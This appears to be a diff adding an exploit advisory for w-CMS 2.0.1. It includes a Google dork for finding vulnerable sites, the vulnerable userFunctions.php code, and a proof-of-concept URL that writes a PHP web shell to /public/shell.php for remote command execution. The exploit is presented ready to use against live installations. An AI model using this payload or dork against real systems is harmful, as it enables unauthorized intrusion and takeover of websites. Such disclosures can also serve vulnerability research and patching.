@@ -1,0 +1,39 @@
+Exploit Title: w-CMS 2.0.1 Remote Code Execution Vulnerability
+Google Dork: intext:"Powered by w-CMS"
+Date: 15/08/2013
+Exploit Author: ICheer_No0M - http://icheernoom.blogspot.com/
+Vendor Homepage: http://w-cms.org/
+Software Link: -
+Version: 2.0.1
+Tested on: Windows 7 + PHP 5.2.6
+
+
+---> Vuln Code : /userFunctions.php
+
+   
+  6. switch($_REQUEST['udef']) // user defined function
+	     ...
+ 11. case 'activity': procActivity(); // <-- call procActivity Function
+	     ...
+254. function procActivity()
+255. {
+256. 	$type    = $_REQUEST['type']; // <-- type
+257. 	$content = $_REQUEST['content']; // <-- content
+258. 	$content = preg_replace("/\|/","\0xff ",$content)."\n";
+259. 	$data = explode("\n",@file_get_contents("./public/$type")); 
+260. 	$file = @fopen("./public/$type", "w"); // <-- filename = $type
+261. 	if($file);
+262. 	{
+263. 		fwrite($file, $content); // <-- fwrite to write $content into $filename
+264.		for($ix=0;$ix<25;$ix++)
+265.		{
+266.			fwrite($file,$data[$ix]."\n");
+267.		}
+268.		fclose($file);
+269. 	}
+    
+---> Exploit/Proof of Concept (PoC)
+ 
+http://localhost/wcms/userFunctions.php?udef=activity&type=shell.php&content=<?php system($_GET['cmd']); ?>
+ 
+Find your shell on /public/shell.php
